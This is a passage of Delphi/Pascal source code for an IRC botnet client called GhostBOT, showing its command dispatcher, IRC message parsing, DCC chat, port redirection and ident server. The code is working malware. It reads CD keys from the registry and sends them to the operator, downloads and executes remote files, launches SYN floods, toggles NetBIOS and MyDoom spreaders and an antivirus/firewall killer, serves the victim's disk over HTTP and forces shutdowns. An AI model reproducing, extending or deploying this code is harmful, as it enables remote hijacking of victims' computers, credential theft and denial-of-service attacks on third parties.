       Clones[ClonesNum].Channel:=Params.Strings(3);
       Clones[ClonesNum].StartBOT;
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartSynFlood;
   BEGIN
     ThreadList.Threads[Thread].GhostBOT.SynFlood.SynFlood;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.Read_Command(MsgFromIRC,MsgFrom:STRING;Sock:TSocket);
   VAR
     Reg      : TRG;
     I        : WORD;
     S        : STRING;
     MsgToIRC : STRING;
     Threads_ : TThreads;

     FUNCTION CheckParam(ParamNum:BYTE) : Boolean;
     BEGIN
       Result:=False;
       IF lstrcmpi(pChar(Params.Strings(0)),pChar(CommandPrefix+MainStr(ParamNum)))=0 THEN BEGIN
         Delete(MsgFromIRC,1,Length(MainStr(ParamNum))+Length(CommandPrefix));
         Result:=True;
       END;
     END;

   BEGIN
     Threads_.GhostBOT:=Self;
     Threads_.Sock:=Sock;
     SplitParams(MsgFromIRC,Params);

     {$IFDEF ALLOW_TOPIC_COMMAND}
     IF TopicCommand THEN MsgTo:=Channel;
     {$ENDIF}

     CASE Params.Count OF
       //Commands without parameter------------------------------------------------
       1 : BEGIN
         //----------------------------------------------------[Stop port redirect]
         IF CheckParam(250) THEN S:=KillThread(PORTREDIRECT_THREAD) ELSE           //"STOPREDIRECT"
         //---------------------------------------------------------------[Log Out]
         IF CheckParam(221) THEN BOTOwner:='' ELSE                                 //"LOGOUT"
         //-------------------------------------------------------[Stop WEB Server]
         IF CheckParam(219) THEN S:=KillThread(WEBSERVER_THREAD) ELSE              //"STOPWEBSERVER"
         //----------------------------------------------------------[List threads]
         IF CheckParam(217) THEN ListThreads(Sock) ELSE                            //"THREADS"
         {$IFDEF Use_NetBIOS_Spreader}
         //---------------------------------------------------------[Start NetBIOS]
         IF CheckParam(215) THEN S:=StartNetBIOS ELSE                              //"STARTNETBIOS"
         //----------------------------------------------------------[Stop NetBIOS]
         IF CheckParam(216) THEN S:=StopNetBIOS ELSE                               //"STOPNETBIOS"
         {$ENDIF}
         {$IFDEF Use_AVFW_Killer}
         //----------------------------------------------------[Start AV/FW Killer]
         IF CheckParam(211) THEN S:=StartAVFWKiller ELSE                           //"STARTAVFWKILLER"
         //-----------------------------------------------------[Stop AV/FW Killer]
         IF CheckParam(212) THEN S:=StopAVFWKiller ELSE                            //"STOPAVFWKILLER"
         {$ENDIF}
         {$IFDEF Use_MyDoom_Spreader}
         //----------------------------------------------------------[Start MyDoom]
         IF CheckParam(205) THEN S:=StartMyDoom ELSE                               //"STARTMYDOOM"
         //-----------------------------------------------------------[Stop MyDoom]
         IF CheckParam(206) THEN S:=StopMyDoom ELSE                                //"STOPMYDOOM"
         {$ENDIF}
         //-----------------------------------------------------------[Kill clones]
         IF CheckParam(106) THEN S:=KillClones ELSE                                //"KILLCLONES"
         //------------------------------------------------------------------[Quit]
         IF CheckParam(107) THEN ExitProcess(0) ELSE                               //"QUIT"
         //-------------------------------------------------------------[Uninstall]
         IF CheckParam(108) THEN Uninstall ELSE                                    //"UNINSTALL"
         //-------------------------------------------------------[Stop IP scanner]
         IF CheckParam(120) THEN BEGIN                                             //"STOPIPSCAN"
           StoPIPScan;
           S:=MainStr(23);                                                         //"Operation Completed!"
         END ELSE
         //------------------------------------------------------------[Restart PC]
         IF CheckParam(121) THEN MyExitWindows(EWX_POWEROFF OR EWX_FORCE) ELSE     //"RESTART"
         //-------------------------------------------------------------[Shut Down]
         IF CheckParam(122) THEN MyExitWindows(EWX_REBOOT or EWX_FORCE) ELSE       //"SHUTDOWN"
         //--------------------------------------------------------------[Get Info]
         IF CheckParam(123) THEN S:=GetInfo ELSE                                   //"INFO"
         //--------------------------------------------------------[List Processes]
         IF CheckParam(37) THEN MySend(MainStr(142)+Channel+' +o '+MsgFrom,Sock) ELSE //"OP"
         //--------------------------------------------------------[List Processes]
         IF CheckParam(124) THEN BEGIN                                             //"LISTPROCESSES"
           WITH ThreadList DO BEGIN
             Thread:=ThreadList.Add;
             Threads[Thread]:=Threads_;
             Threads[Thread].TType:=LISTPROCESS_THREAD;
             Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.ListProcess,NIL,0,ThreadID);
           END;
         END ELSE
         //------------------------------------------------------------------[KEYS]
         {$IFDEF Use_CDKey_Stealer}
         IF CheckParam(125) THEN BEGIN                                             //"CDKEYS"
           Reg:=TRG.Create;
           FOR I:=1 TO ItemsCountInEncodedString(TKEYS) DIV 3 DO BEGIN
             Reg.RootKey:=HKEY_LOCAL_MACHINE;
             IF Reg.OpenKey(MainStr(46)+KeyStr((I-1)*3+2),False) THEN BEGIN        //"\software\"
               IF Reg.ValueExists(KeyStr((I-1)*3+3)) THEN BEGIN
                  PrivMsg(KeyStr((I-1)*3+1)+': '+Reg.ReadString(KeyStr((I-1)*3+3)),Sock);
                  Sleep(FloodDelay);
               END;
               Reg.CloseKey;
              END;
            END;
            S:=MainStr(23);                                                        //"Operation Completed!"
          END ELSE
          {$ENDIF}
          //------------------------------------------------------------[Reconnect]
          IF CheckParam(126) THEN Restart;                                         //"RECONNECT"
        END;
        //Commands with 1 parameter------------------------------------------------
        2 : BEGIN
          //---------------------------------------------------------------[Update]
          IF CheckParam(204) THEN Update(Params.Strings(1)) ELSE                   //"UPDATE"
          //-------------------------------------------------------------[DCC send]
          IF CheckParam(127) THEN BEGIN                                            //"GET"
            DCCNick:=From;
            DCCFileName:=Params.Strings(1);
            WITH ThreadList DO BEGIN
             Thread:=Add;
             Threads[Thread]:=Threads_;
             Threads[Thread].TType:=DCCSEND_THREAD;
             Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.DCC_Send,NIL,0,ThreadID);
           END;
          END;
          //-------------------------------------------------------------[Make dir]
          IF CheckParam(128) THEN IF CreateDir(Params.Strings(1),0) THEN S:=MainStr(23) ELSE S:='Error creating dir'; //"MAKEDIR","Operation Completed!"
          //----------------------------------------------------------[KillProcess]
          IF CheckParam(129) THEN S:=KillProcess(Params.Strings(1)) ELSE           //"KILLPROCESS"
          //--------------------------------------------------------------[Execute]
          IF CheckParam(130) THEN S:=ExecuteFile(Params.Strings(1)) ELSE           //"EXECUTE"
          //----------------------------------------------------------[Delete File]
          IF CheckParam(132) THEN BEGIN                                            //"DELETE"
            IF DeleteFile(pChar(Params.Strings(1))) THEN S:='Delete Completed' ELSE S:='Error: Delete!';
          END ELSE
          //-------------------------------------------------------[List Directory]
          IF CheckParam(133) THEN BEGIN                                            //"LIST"
            WITH ThreadList DO BEGIN
              Thread:=Add;
              Threads[Thread]:=Threads_;
              Threads[Thread].Params1:=Params.Strings(1);
              Threads[Thread].TType:=LISTDIR_THREAD;
              Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.ListDir,NIL,0,ThreadID);
             END;
          END;
        END;
        //Commands with 2 parameters-----------------------------------------------
        3 : BEGIN
          //------------------------------------------------------[Start IP scanne]
          IF CheckParam(134) THEN IPScan(Params.Strings(1),Params.Strings(2),Self,Sock) ELSE //"IPSCAN"
          //-------------------------------------------------------------[Download]
          IF CheckParam(131) THEN S:=DownloadFile(Params.Strings(1)) ELSE          //"DOWNLOAD"
          //----------------------------------------------------------[Rename File]
          IF CheckParam(135) THEN BEGIN                                            //"RENAME"
            IF RenameFile(Params.Strings(1),Params.Strings(2)) THEN S:=MainStr(23) ELSE S:='Error: Rename!';      //"Operation Completed!"
          END ELSE
          //----------------------------------------------------------[http server]
          {$IFDEF Use_WEB_Server}
          IF CheckParam(136) THEN BEGIN                                            //"HTTPSERVER"
            KillThread(WEBSERVER_THREAD);
            WebServerPort:=Params.Strings(1);
            Directory:=Params.Strings(2);
            IF Directory[Length(Directory)]='\' THEN SetLength(Directory,Length(Directory)-1);
            IF Directory='' THEN Directory:='c:';
            Thread:=ThreadList.Add;
            ThreadList.Threads[Thread].TType:=WEBSERVER_THREAD;
            ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.StartWeb,NIL,0,ThreadID);
            S:=MainStr(141)+NameToIP('')+':'+WebServerPort;                        //"http://"
            WebServerInfo:=S;
          END;
          {$ENDIF}
        END;
        4 : BEGIN
          IF CheckParam(183) THEN BEGIN
            Thread:=ThreadList.Add;
            ThreadList.Threads[Thread].TType:=PORTREDIRECT_THREAD;
            ThreadList.Threads[Thread].Params1:=IntToStr(Listen2(StrToInt(Params.Strings(1))));
            ThreadList.Threads[Thread].Params2:=Params.Strings(2);
            ThreadList.Threads[Thread].Params3:=Params.Strings(3);
            ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.Port_Redirect,NIL,0,ThreadID);
          END;
        END;
        5 : BEGIN
          //---------------------------------------------------------------[Clones]
          IF CheckParam(137) THEN BEGIN                                            //"CLONE"
            KillClones;
            FOR I:=1 TO StrToInt(Params.Strings(4)) DO IF I<=MaxNumberOfClones THEN BEGIN
              Thread:=ThreadList.Add;
              ThreadList.Threads[Thread]:=Threads_;
              ThreadList.Threads[Thread].TType:=CLONESS_THREAD;
              ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@CreateClones,NIL,0,ThreadID);
            END;
          END;
        END;
      END;
      //-------------------------------------------------------------[mIRC command]
      IF CheckParam(218) THEN BEGIN
        S:=MsgFromIRC;
        Delete(S,1,Pos(' ',MsgFromIRC));
        mIrcCmd(S);                                                                //"MIRCCMD"
        S:='';
      END;
      //---------------------------------------------------------------[raw clones]
      IF CheckParam(138) THEN BEGIN                                                //"RAWCLONES"
        MsgToIRC:=MsgFromIRC;
        FOR I:=1 TO MaxNumberOfClones DO IF (I<=MaxNumberOfClones) THEN Clones[I].MySend(MsgToIRC,Clones[I].BOTSock);
      END ELSE
      {$IFDEF SYN_FLOOD}
      //----------------------------------------------------------------[Syn flood]
      IF CheckParam(195) THEN BEGIN                                                //"SYN"
        KillThread(SYNFLOODER_THREAD);
        SynFlood:=TSynFlood.Create;
        SynFlood.Sock:=Sock;
        SynFlood.SynParams:=MsgFromIRC;
        Thread:=ThreadList.Add;
        ThreadList.Threads[Thread]:=Threads_;
        ThreadList.Threads[Thread].TType:=SYNFLOODER_THREAD;
        ThreadList.Threads[Thread].Handle:=CreateThread(NIL,0,@StartSYNFlood,NIL,0,ThreadID);
      END ELSE
      //-----------------------------------------------------------[Stop Syn flood]
      IF CheckParam(194) THEN S:=KillThread(SYNFLOODER_THREAD) ELSE                       //"STOPSYN"
      {$ENDIF}
      //--------------------------------------------------------------[raw command]
      IF CheckParam(139) THEN MySend(MsgFromIRC,BOTSock) ELSE                      //"RAW"
      //---------------------------------------------------------------[Disconnect]
      IF CheckParam(140) THEN BEGIN                                                //"DISCONNECT"
        CloseSocket(BOTSock);
        I:=StrToInt(Params.Strings(1));
        IF I=0 THEN I:=30;
        Sleep(I*1000);
        Exit;
      END;
      //Send results to IRC server-------------------------------------------------
      IF S<>'' THEN PrivMsg(S,Sock);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.ReadSock;
   LABEL
     Restart;
   VAR
     {$IFDEF use_hostname_match}
     C          : WORD;
     {$ENDIF}
     S          : STRING;
     MsgFromIRC : STRING;
     MsgFrom    : STRING;
     E          : STRING;
     Hosts      : STRING;
     I          : Longint;
     K          : Longint;
   BEGIN
     E:=Remain+Buffer;
     IF Length(E)=0 THEN Exit;
     REPEAT
       I:=Pos(CRLF,E);
       IF I>0 THEN BEGIN
         MsgFromIRC:=Copy(E,1,I+1);
         Delete(E,1,I+1);
         Remain:=E;
       END ELSE BEGIN
         Remain:=E;
         Exit;
       END;
       {$IFDEF DEBUG}
       Writeln(MsgFromIRC);
       {$ENDIF}
       IF Pos('ERROR :',MsgFromIRC)=1 THEN Self.Restart;
       TopicCommand:=False;

       IF Pos(MainStr(143),MsgFromIRC)=0 THEN BEGIN                                //"PRIVMSG"
         IF(Pos(' 432 ',MsgFromIRC)>0)OR(Pos(' 433 ',MsgFromIRC)>0) THEN BEGIN
           IRCNick:=GetNick;
           MySend(MainStr(176)+IRCNick,BOTSock);                                   //"NICK "
         END;

         IF Pos(MainStr(184),MsgFromIRC)>0 THEN BEGIN                              //"PING :"
           Delete(MsgFromIRC,1,Pos(':',MsgFromIRC)-1);
           MySend(MainStr(177)+MsgFromIRC,BOTSock);                                //"PONG "
         END;

         {$IFDEF ALLOW_TOPIC_COMMAND}
         IF Pos(' 332 '+IrcNick+' '+Channel,MsgFromIRC)>0 THEN BEGIN
           TopicCommand:=True;
           Delete(MsgFromIrc,1,1);
           Delete(MsgFromIRC,1,Pos(':',MsgFromIRC));
           SetLength(MsgFromIRC,Length(MsgFromIRC)-2);                             //Delete #13#10 at end
         END;
         {$ENDIF}

         IF(Pos(' 422 ',MsgFromIRC)>0)OR(Pos(' 376 ',MsgFromIRC)>0) THEN BEGIN
           {$IFDEF rawcommands_after_connect}
           S:=RAWCommands;
           I:=Pos(MainStr(175),S);                                                 //"$NICK"
           Delete(S,I,5);
           Insert(IRCNick,S,I);
           {$IFDEF USE_IDENT_SERVER}
           Run_Ident:=False;
       IF IdentSock>0 THEN CloseSocket(IdentSock);
       {$ENDIF}
           MySend(S,BOTSock);
           {$ENDIF}

           MySend(MainStr(174)+Channel+' '+BOTStr(3),BOTSock);                     //"JOIN "

           //Set channel password
           IF BOTStr(3)<>'' THEN MySend(MainStr(142)+Channel+' +k '+BOTStr(3),BOTSock);  //"MODE "
         END;

         {$IFDEF rawcommands_after_join}
         IF(Pos(' 366 ',MsgFromIRC)>0) THEN BEGIN
           S:=onjoin_commands;
           I:=Pos(MainStr(173),S);                                                 //"$CHAN"
           Delete(S,I,5);
           Insert(Channel,S,I);
           MySend(S,BOTSock);
           JoinedToChannel:=True;
         END;
         {$ENDIF}
       END;

       {$IFDEF GIVE_PING_REPLY}
       I:=Pos(MainStr(246),MsgFromIRC);                                            //":PING"
       IF I>0 THEN MySend(MainStr(48)+Copy(MsgFromIRC,2,Pos('!',MsgFromIRC)-2)+MainStr(172)+Copy(MsgFromIRC,I+7,Length(MsgFromIRC)),BOTSock);  //"PRIVMSG "," :PONG "
       {$ENDIF}

       {$IFDEF GIVE_VERSION_REPLY}
       S:=BOTStr(4);
       {$IFDEF use_fake_version}
       S:=DecodeString(Random(ItemsCountInEncodedString(TVERSIONS))+1,TVERSIONS);
       {$ENDIF}

       IF Pos(MainStr(168),MsgFromIRC)>0 THEN MySend(MainStr(170)+Copy(MsgFromIRC,2,Pos('!',MsgFromIRC)-2)+MainStr(171)+S+'',BOTSock); //":VERSION","NOTICE "," :VERSION "
       {$ENDIF}

       K:=Pos(MainStr(247),MsgFromIRC);                                            //"DCC CHAT"
       IF K>0 THEN BEGIN
         S:=MsgFromIRC;
         Delete(S,1,K+9);
         SetLength(S,Pos('',S)-1);
         WITH ThreadList DO BEGIN
           Thread:=Add;
           Threads[Thread].Params1:=S;
           Threads[Thread].TType:=DCCCHAT_THREAD;
           Threads[Thread].GhostBOT:=Self;
           Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.DCCChat,NIL,0,ThreadID);
         END;
       END;

       MsgTo:=Channel;

       IF Pos(CommandPrefix+MainStr(144),MsgFromIRC)>0 THEN BOTOwner:='';          //"login "
       IF Pos(CommandPrefix+MainStr(144)+BOTStr(1),MsgFromIRC)>0 THEN BEGIN        //"login "
         Hosts:=MsgFromIRC;
         Delete(Hosts,1,Pos('!',MsgFromIRC));
         SetLength(Hosts,Pos(' ',Hosts)-1);
         HostName:=Hosts;
         BOTOwner:=HostName;
         {$IFDEF use_hostname_match}
         Delete(HostName,1,Pos('@',HostName));
         GoodHost:=False;
         FOR I:=1 TO ItemsCountInEncodedString(TAUTHHOST) DO BEGIN
           FOR C:=1 TO Length(HostStr(I)) DO BEGIN
             IF (HostStr(I)[C]<>HostName[C])AND(HostStr(I)[C]<>'*') THEN BEGIN GoodHost:=False; Break END ELSE
               IF (HostStr(I)[C]<>HostName[C])AND(HostStr(I)[C]='*') THEN GoodHost:=True ELSE
                 IF (HostStr(I)[C]=HostName[C]) THEN GoodHost:=True;
           END;
           IF GoodHost THEN Break;
         END;
         {$ENDIF}
       END;

       IF ({$IFDEF use_hostname_match}(GoodHost)AND{$ENDIF}(Pos(BOTOwner,MsgFromIRC)>0))OR(TopicCommand) THEN BEGIN

         I:=Pos(MainStr(167),MsgFromIRC);                                          //"DCC SEND"
         IF I>0 THEN BEGIN
           S:=MsgFromIRC;
           Delete(S,1,I+9);
           SetLength(S,Pos('',S)-1);
           DCCGetStr:=S;
           WITH ThreadList DO BEGIN
             Thread:=Add;
             Threads[Thread].Sock:=BOTSock;
             Threads[Thread].GhostBOT:=Self;
             Threads[Thread].TType:=DCCGET_THREAD;
             Threads[Thread].Handle:=CreateThread(NIL,0,@TGhostBOT.DCC_GET,NIL,0,ThreadID);
           END;
         END;

         MsgFrom:=Copy(MsgFromIRC,2,Pos('!',MsgFromIRC)-2);

         I:=Pos('#',MsgFromIRC);
         IF I>0 THEN MsgTo:=Copy(MsgFromIRC,I,Pos(' :',MsgFromIRC)-I) ELSE MsgTo:=MsgFrom;
         IF K>0 THEN MsgTo:=Channel;                                               //Send messages to main channel if you use DCC chat

         IF Pos(MainStr(167),MsgFromIRC)>0 THEN MsgTo:=Channel;                    //"DCC SEND"

         From:=Copy(MsgFromIRC,2,Pos('!',MsgFromIRC)-2);

         Delete(MsgFromIRC,1,Length(BOTOwner));

         IF Pos(MainStr(143),MsgFromIRC)>0 THEN BEGIN                              //"PRIVMSG"
           Delete(MsgFromIRC,1,Pos(':',MsgFromIRC));
           SetLength(MsgFromIRC,Pos(CRLF,MsgFromIRC)-1);
         END;

         Read_Command(MsgFromIRC,MsgFrom,BOTSock);

       END;
     UNTIL Pos(CRLF,E)=0;
     FillChar(Buffer,SizeOf(Buffer),0);
   END;

   //------------------------------------------------------------------------------
   FUNCTION Create_Sock(Host:STRING;Port:STRING):TSocket;
   VAR
     Sock        : TSocket;
     InAddr      : in_addr;
     lpHostEntry : PHostEnt;
     SockAddr    : TSockAddrIn;
   BEGIN
     lpHostEntry:=NIL;
     Sock:=Socket(AF_INET,SOCK_STREAM,0);
     IF Sock=INVALID_SOCKET THEN BEGIN
       Result:=-1;
       Exit;
     END;
     FillChar(SockAddr,SizeOf(SockAddr),0);
     SockAddr.sin_family:=AF_INET;
     SockAddr.sin_port:=htons(StrToInt(Port));
     InAddr.S_addr:=inet_addr(pChar(Host));
     IF InAddr.S_addr=INADDR_NONE THEN lpHostEntry:=GetHostByName(pChar(Host));
     IF(lpHostEntry=NIL)AND(InAddr.S_addr=INADDR_NONE) THEN BEGIN
       Result:=-2;
       Exit;
     END;
     IF lpHostEntry<>NIL THEN SockAddr.sin_addr:=in_addr(PLongint(lpHostEntry^.h_addr_list^)^) ELSE SockAddr.sin_addr.S_addr:=inet_addr(pChar(host));
     IF Connect(Sock,SockAddr,SizeOf(SockAddr))=SOCKET_ERROR THEN BEGIN
       CloseSocket(Sock);
       Result:=-1;
       Exit;
     END;
     Result:=Sock;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.DCCChat;
   VAR
     Host     : STRING;
     Buffer2  : STRING;
     Port     : STRING;
     BOTOwner : Boolean;
     DCC      : TSocket;
     Paramss  : TStrList;
     Buffer   : ARRAY[1..4096] OF Char;
   BEGIN
     BOTOwner:=False;
     Paramss:=TStrList.Create;
     SplitParams(ThreadList.Threads[Thread].Params1,Paramss);
     Port:=Paramss.Strings(2);
     Host:=Paramss.Strings(1);
     DCC:=Create_Sock(Host,Port);
     IF (DCC>0) THEN BEGIN
       WHILE True DO BEGIN
         FillChar(Buffer,SizeOf(Buffer),0);
         IF Recv(DCC,Buffer,SizeOf(Buffer),0)<=0 THEN Break;
         Buffer2:=STRING(pChar(STRING(Buffer)));
         IF Length(Buffer2)<3 THEN Continue;
         Delete(Buffer2,Length(Buffer2),2);
         IF Pos(CommandPrefix+MainStr(144),Buffer2)=1 THEN BotOwner:=False;        //"login "
         IF Pos(CommandPrefix+MainStr(144)+BOTStr(1),Buffer2)>0 THEN BOTOwner:=True; //"login "
         IF BOTOwner THEN ThreadList.Threads[Thread].GhostBOT.Read_Command(Buffer2,'',DCC);
       END;
       CloseSocket(DCC);
     END ELSE ThreadList.Threads[Thread].GhostBOT.PrivMsg(MainStr(71),ThreadList.Threads[Thread].GhostBOT.BOTSock);                                        //"Error connecting!"
     Paramss.Free;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.StartBOT;
   BEGIN
     Params:=TStrList.Create;
     ClonesNum:=0;
     StartUp;
     SendInfo;

     WHILE True DO IF (recv(BOTSock,Buffer,SizeOf(Buffer),0))<1 THEN Restart ELSE ReadSock;
   END;

   VAR
     RedirectSock_In : TSocket;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.Port_Redirect : DWORD;
   VAR
     SockAddr : TSockAddr;
     AddrLen  : Integer;
     ID       : DWORD;
     XPort    : STRING;
     XHost    : STRING;
     Sock3    : TSocket;
     //----------------------------------------------------------------------------
     FUNCTION Redirect_Transfer(Sock_In,Sock_Out:TSocket) : Integer;
     VAR
       Buf  : ARRAY[1..4096] OF Char;
       Err  : Integer;
       Err2 : Integer;
     BEGIN
       FillChar(Buf[1],SizeOf(Buf),0);
       Err:=Recv(Sock_In,Buf[1],SizeOf(Buf),0);
       IF Err=0 THEN BEGIN
         Result:=-1;
         Exit;
       END;
       IF Err=SOCKET_ERROR THEN BEGIN
         IF WSAGetLastError()=WSAEWOULDBLOCK THEN BEGIN
           Result:=0;
           Exit;
         END;
         Result:=-1;
         Exit;
       END;
       Err2:=Send(Sock_Out,Buf[1],Err,0);
       IF Err2=0 THEN BEGIN
         Result:=-1;
         Exit;
       END;
       IF Err2=SOCKET_ERROR THEN BEGIN
         IF WSAGetLastError()=WSAEWOULDBLOCK THEN BEGIN
           Result:=0;
           Exit;
         END;
         Result:=-1;
         Exit;
       END;
       Result:=0;
     END;

     //----------------------------------------------------------------------------
     FUNCTION Redirect_IO : DWORD; STDCALL;
     VAR
       Sock_Out  : TSocket;
       Sock_In   : TSocket;
       Mode      : Cardinal;
       FD_Struct : TFDSet;
     BEGIN
       Sock_In:=RedirectSock_In;
       Sock_Out:=Create_Sock(ThreadList.Threads[Integer(Thread)].Params2,ThreadList.Threads[Integer(Thread)].Params3);
       IF Sock_Out<1 THEN BEGIN
         CloseSocket(Sock_In);
         Result:=0;
         Exit;
       END;
       Mode:=1;
       IOCTLSocket(Sock_Out,FIONBIO,Mode);
       IOCTLSocket(Sock_In,FIONBIO,Mode);
       WHILE TRUE DO BEGIN
         FD_ZERO(FD_Struct);
         FD_SET(Sock_In,FD_Struct);
         FD_SET(Sock_Out,FD_Struct);
         IF Select(0,@FD_Struct,NIL,NIL,NIL)=SOCKET_ERROR THEN Break;
         IF(FD_ISSET(Sock_In,FD_Struct))AND(Redirect_Transfer(Sock_In,Sock_Out)=-1) THEN Break;
         IF(FD_ISSET(Sock_Out,FD_Struct))AND(Redirect_Transfer(Sock_Out,Sock_In)=-1) THEN Break;
       END;
       CloseSocket(Sock_Out);
       CloseSocket(Sock_In);
       Result:=0;
     END;
   BEGIN
     Sock3:=StrToInt(ThreadList.Threads[Thread].Params1);
     XHost:=ThreadList.Threads[Thread].Params2;
     XPort:=ThreadList.Threads[Thread].Params3;
     WHILE True DO BEGIN
       AddrLen:=SizeOf(SockAddr);
       RedirectSock_In:=Accept(Sock3,@SockAddr,@AddrLen);
       IF RedirectSock_In=INVALID_SOCKET THEN Break;
       CreateThread(NIL,0,@Redirect_IO,NIL,0,ID);
       Sleep(10);
     END;
     CloseSocket(Sock3);
     Result:=0;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TGhostBOT.Listen2(Port:Integer) : TSocket;
   VAR
     Sock     : TSocket;
     SockAddr : TSockAddrIn;
   BEGIN
     Sock:=Socket(AF_INET,SOCK_STREAM,0);

     IF Sock=INVALID_SOCKET THEN BEGIN
       Result:=-1;
       Exit;
     END;
     FillChar(SockAddr,SizeOf(SockAddr),0);
     SockAddr.sin_family:=AF_INET;
     SockAddr.sin_port:=htons(Port);
     SockAddr.sin_addr.s_addr:=INADDR_ANY;
     IF Bind(Sock,SockAddr,SizeOf(SockAddr))<>0 THEN BEGIN
       Result:=-1;
       Exit;
     END;
     IF listen(Sock,SOMAXCONN)<>0 THEN BEGIN
       Result:=-1;
       Exit;
     END;
     Result:=Sock;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TGhostBOT.IdentServ;
   VAR
     Sock      : TSocket;
     IdentAddr : TSockAddr;
     Buf       : STRING;
     AddrLen   : Integer;
   BEGIN
     Self:=ThreadList.Threads[Thread].GhostBOT;

     IdentSock:=Listen2(113);
     IF IdentSock=-1 THEN Exit;
     AddrLen:=SizeOf(IdentAddr);
     WHILE Run_Ident DO BEGIN

       Sock:=Accept(IdentSock,@IdentAddr,@AddrLen);
       IF Sock<>INVALID_SOCKET THEN BEGIN
         Buf:=IntToStr(Random(6000)+1)+', '+IRCPort+MainStr(248)+IRCNick+CRLF;     //" : USERID : UNIX : "
         Send(Sock,Buf[1],Length(Buf),0);
         Sleep(1000);
         CloseSocket(Sock);
       END;
     END;
     CloseSocket(IdentSock);
     KillThread(IDENTSERVER_THREAD);
   END;

   PROCEDURE TGhostBOT.MircCmd(S:STRING);
   VAR
     MWnd     : HWND;
     mData    : Pointer;
     hFileMap : Cardinal;
   BEGIN
     MWnd:=FindWindow(pChar(MainStr(249)),NIL);                                    //"mIRC"
     IF MWnd>0 THEN BEGIN
       hFileMap:=CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,pChar(MainStr(249))); //"mIRC"
       mData:=MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
       Move(S[1],mData^,Length(S));
       SendMessage(MWnd,WM_USER+200,1,0);
       SendMessage(MWnd,WM_USER+201,1,0);
       UnMapViewOfFile(mData);
       CloseHandle(hFileMap);
     END;
   END;

   BEGIN
     Randomize;
     ThreadList:=TThreadList.Create;
   END.
